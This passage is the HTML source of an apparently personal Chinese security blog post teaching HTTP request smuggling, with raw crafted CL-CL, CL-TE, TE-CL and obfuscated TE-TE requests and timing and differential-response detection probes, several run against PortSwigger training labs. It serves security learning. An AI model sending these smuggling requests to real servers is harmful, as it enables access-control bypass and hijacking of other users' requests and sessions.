@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="第一次听到这个名词，是在和sun师傅的一次对话中，从此就给我留下了很深的印象(没错，福建男人对走私两个字很敏感)，最近刷sun师傅的博客，偶然发现了他写的这篇关于http请求走私的文章，所以准备来深入学习一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="http请求走私">
+<meta property="og:url" content="http://example.com/2025/10/23/Done-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/index.html">
+<meta property="og:site_name" content="Twansh&#x2F;Eminem">
+<meta property="og:description" content="第一次听到这个名词，是在和sun师傅的一次对话中，从此就给我留下了很深的印象(没错，福建男人对走私两个字很敏感)，最近刷sun师傅的博客，偶然发现了他写的这篇关于http请求走私的文章，所以准备来深入学习一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-10-22T16:43:25.000Z">
+<meta property="article:modified_time" content="2025-10-31T14:38:09.006Z">
+<meta property="article:author" content="Kwansh">
+<meta property="article:tag" content="专题强化练">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2025/10/23/Done-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>http请求走私 | Twansh/Eminem</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Twansh/Eminem</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/23/Done-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Kwansh">
+      <meta itemprop="description" content="往事越千年,魏武挥鞭,东临碣石有遗篇。萧瑟秋风今又是,换了人间">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Twansh/Eminem">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          http请求走私
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-10-23 00:43:25" itemprop="dateCreated datePublished" datetime="2025-10-23T00:43:25+08:00">2025-10-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-10-31 22:38:09" itemprop="dateModified" datetime="2025-10-31T22:38:09+08:00">2025-10-31</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">第一次听到这个名词，是在和sun师傅的一次对话中，从此就给我留下了很深的印象(没错，福建男人对走私两个字很敏感)，最近刷sun师傅的博客，偶然发现了他写的这篇关于http请求走私的文章，所以准备来深入学习一下</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>最近压力暴大，可能是开始解出一些让我感到困难且无从下手的内容吧(永远讨厌php)，所以来学一学http请求走私这块内容(原理等相对简单，给了我很大的放松感)</p>
+<h2 id="什么是http请求走私"><a href="#什么是http请求走私" class="headerlink" title="什么是http请求走私"></a>什么是http请求走私</h2><p>http请求走私可以通过欺骗代理服务器，负载均衡器或者服务器中的中间节点，利用前后不一致的验证方式实现请求走私危害，可以造成数据泄露，访问控制绕过，会话劫持，跨站脚本攻击等危害</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="CL-Content-Length"><a href="#CL-Content-Length" class="headerlink" title="CL(Content-Length)"></a>CL(Content-Length)</h3><p>这个也太常见了，我想不用解释大家也知道是什么，这里就不过多解释，不懂的可以google一下</p>
+<h3 id="TE-Transfer-Encoding"><a href="#TE-Transfer-Encoding" class="headerlink" title="TE(Transfer-Encoding)"></a>TE(Transfer-Encoding)</h3><p>这个就是一种传输编码方式，跟它的名字一样，就是在传输过程中对消息体进行编码，然后可以在传输过程中对消息体进行压缩或分块传输等操作。当服务器无法确定响应的大小时，如动态生成的响应或者通过流式传输时，就可以使用Transfer-Encoding来实现分块传输(0就是截断)</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>主要就是因为前后端校验不一致造成的，前端与后端的校验方法不一致，前端对包进行校验后交给后端，但是后端校验方法不同，对包进行异常截断，所以这导致请求走私</p>
+<h2 id="请求走私分类"><a href="#请求走私分类" class="headerlink" title="请求走私分类"></a>请求走私分类</h2><h3 id="CL不为0的GET请求"><a href="#CL不为0的GET请求" class="headerlink" title="CL不为0的GET请求"></a>CL不为0的GET请求</h3><p>前端代理服务器允许GET请求携带请求体，但后端服务器不允许GET请求携带请求体，则后端服务器会忽略掉GET请求中的Content-Length，不进行处理，从而导致请求走私，代码演示如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: Example Domain\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: Example Domain\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+<p>前端服务器收到该请求，通过读取Content-Length，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对Content-Length进行处理，由于Pipeline的存在，它就认为这是收到了两个请求。</p>
+<h3 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h3><p>假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端服务器按照第二个Content-Length的值进行处理。这样有可能引发请求走私</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: Example Domain\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
+<p>前端代理服务器获取的数据包长度为 8，将以上数据包完整转发至后端服务器，但后端服务器仅接收长度为7的数据包。因此读取前7个字符后，后端服务器认为本次请求已经读取完毕，然后返回响应。<br>但此时缓冲区仍留下一个a，对于后端服务器来讲，这个a是下一个请求的一部分，但没传输完毕。如果此时传来一个请求:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">HOST: test.com</span><br></pre></td></tr></table></figure>
+
+<p>那么前端服务器和后端服务器将重用TCP连接，使后端实际接收的请求为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGET / HTTP/1.1</span><br><span class="line">HOST: test.com</span><br></pre></td></tr></table></figure>
+<h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length这一请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding这一请求头。</p>
+<p>chunk传输数据格式如下，其中size的值由16进制表示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>
+<p>构造数据包如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: Client Error: Forbidden\r\n</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q=0.5\r\n</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+<p>在<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">bp靶场</a>中进行测试<br>会发现由于前端服务器处理Content-Length，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+<p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理Transfer-Encoding，当它读取到0\r\n\r\n时，认为已经读取到结尾了，但是剩下的字母G就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Host: Client Error: Forbidden\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。<br>构造数据包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: Client Error: Forbidden\r\n</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q=0.5\r\n</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+<p>在<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">bp靶场</a>中测试<br>由于前端服务器处理Transfer-Encoding，当其读取到0\r\n\r\n时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，当它读取完12\r\n之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h3><p>TE-TE，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理Transfer-Encoding请求头，这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的Transfer-Encoding进行某种混淆操作，从而使其中一个服务器不处理Transfer-Encoding请求头。从某种意义上还是CL-TE或者TE-CL<br>构造请求包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: Client Error: Forbidden\r\n</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q=0.5\r\n</span><br><span class="line">Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">bp靶场</a><br>需要\r\n\r\n在后面加上尾随序列 0</p>
+<h2 id="检测请求走私"><a href="#检测请求走私" class="headerlink" title="检测请求走私"></a>检测请求走私</h2><p>手动检测主要依靠计时技术和差异响应</p>
+<h3 id="计时技术检测CL-TE漏洞"><a href="#计时技术检测CL-TE漏洞" class="headerlink" title="计时技术检测CL-TE漏洞"></a>计时技术检测CL-TE漏洞</h3><p>如果应用程序容易受到请求走私的CL-TE变体的攻击，则发送如下所示的请求通常会导致时间延迟</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">A</span><br><span class="line">1</span><br><span class="line">X</span><br></pre></td></tr></table></figure>
+<p>由于前端服务器使用Content-Length标头，因此它将仅转发此请求的一部分，而忽略X。后端服务器使用Transfer-Encoding标头，处理第一个块，然后等待下一个块到达。这将导致明显的时间延迟</p>
+<h3 id="计时技术检测TE-CL漏洞"><a href="#计时技术检测TE-CL漏洞" class="headerlink" title="计时技术检测TE-CL漏洞"></a>计时技术检测TE-CL漏洞</h3><p>如果应用程序容易受到TE-CL变种的请求走私攻击，则发送如下所示的请求通常会导致时间延迟</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 6</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure>
+<p>于前端服务器使用Transfer-Encoding标头，因此它将仅转发此请求的一部分，而忽略X。后端服务器使用Content-Length标头，期望消息正文中有更多内容，然后等待其余内容到达。这将导致明显的时间延迟<br>如果应用程序容易受到该漏洞的CL-TE变体的攻击，则基于时间的TE-CL漏洞测试可能会破坏其他应用程序用户。因此，要隐身并最大程度地减少中断，应该首先使用CL-TE测试，只有在第一个测试失败的情况下才继续进行TE-CL测试</p>
+<h3 id="差异响应检测CL-TE漏洞"><a href="#差异响应检测CL-TE漏洞" class="headerlink" title="差异响应检测CL-TE漏洞"></a>差异响应检测CL-TE漏洞</h3><p>构造数据包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a8b00ea03ae99e98384238a0087000e.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: https://0a8b00ea03ae99e98384238a0087000e.web-security-academy.net/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Length: 23</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST /404 HTTP/1.1</span><br></pre></td></tr></table></figure>
+<p>如果攻击成功，则后端服务器会将此请求的最后两行视为属于接收到的下一个请求。这将导致随后的“正常”请求如下所示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /404 HTTP/1.1</span><br></pre></td></tr></table></figure>
+<p>由于此请求现在包含无效的URL，因此服务器将以状态代码404进行响应，攻击请求确实对其进行了干扰<br>所以说这个请求包后续会回显一个error或者invalid request作为特征</p>
+<h3 id="差异响应检测TE-CL漏洞"><a href="#差异响应检测TE-CL漏洞" class="headerlink" title="差异响应检测TE-CL漏洞"></a>差异响应检测TE-CL漏洞</h3><p>构造如下请求包(需要\r\n\r\n在final 后面加上尾随序列0)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0ad600ed03a42efb80952b65007a003a.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<p>如果攻击成功，则后端服务器将从GPOST &#x2F; HTTP&#x2F;1.1开始将所有内容视为属于接收到的下一个请求。这将导致随后的“正常”请求如下所示</p>
+<p>即会回显出GPOST的request方式</p>
+<h3 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h3><p>我们也可以利用工具进行检测<br><a target="_blank" rel="noopener" href="https://github.com/anshumanpattnaik/http-request-smuggling">https://github.com/anshumanpattnaik/http-request-smuggling</a><br>或者直接搜bp插件，在BAPP上搜索HTTP Request Smuggler即可</p>
+<p>全文几乎是”fork”自博客<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/643981358">https://zhuanlan.zhihu.com/p/643981358</a>,这篇文章讲的实在是精彩，而且通俗易懂</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%B8%93%E9%A2%98%E5%BC%BA%E5%8C%96%E7%BB%83/" rel="tag"># 专题强化练</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/10/19/Done-%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAbaby4/" rel="prev" title="群友靶机baby4">
+      <i class="fa fa-chevron-left"></i> 群友靶机baby4
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/10/29/Done-%E5%9E%83%E5%9C%BE%E4%BD%AC%E8%A7%82%E5%90%8E%E6%84%9F/" rel="next" title="垃圾佬观后感">
+      垃圾佬观后感 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFhttp%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="nav-number">1.</span> <span class="nav-text">什么是http请求走私</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CL-Content-Length"><span class="nav-number">2.1.</span> <span class="nav-text">CL(Content-Length)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TE-Transfer-Encoding"><span class="nav-number">2.2.</span> <span class="nav-text">TE(Transfer-Encoding)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">3.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%86%E7%B1%BB"><span class="nav-number">4.</span> <span class="nav-text">请求走私分类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CL%E4%B8%8D%E4%B8%BA0%E7%9A%84GET%E8%AF%B7%E6%B1%82"><span class="nav-number">4.1.</span> <span class="nav-text">CL不为0的GET请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CL-CL"><span class="nav-number">4.2.</span> <span class="nav-text">CL-CL</span></a></li><li 